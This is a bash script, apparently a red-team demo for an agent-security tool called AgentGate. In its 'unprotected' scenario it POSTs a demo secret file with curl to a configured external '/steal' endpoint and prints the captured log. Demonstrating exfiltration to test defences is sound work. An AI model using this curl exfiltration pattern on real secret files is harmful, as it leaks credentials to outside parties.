#!/usr/bin/env bash
set -euo pipefail

source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/demo-common.sh"

session_id="${1:-demo-redteam-unprotected}"

ensure_demo_secret
reset_exfil_log

echo "[demo:redteam] session=${session_id}"
echo "[demo:redteam] payload source=${AGENTGATE_EXFIL_SECRET_FILE}"
echo "[demo:redteam] external sink=http://${AGENTGATE_EXFIL_HOST}:${AGENTGATE_EXFIL_PORT}/"

curl -fsS -X POST \
  --data-binary @"${AGENTGATE_EXFIL_SECRET_FILE}" \
  "http://${AGENTGATE_EXFIL_HOST}:${AGENTGATE_EXFIL_PORT}/steal" >/dev/null

wait_for_exfil 10 1

echo "[demo:redteam] exfiltration completed"
cat "${AGENTGATE_EXFIL_FILE}"
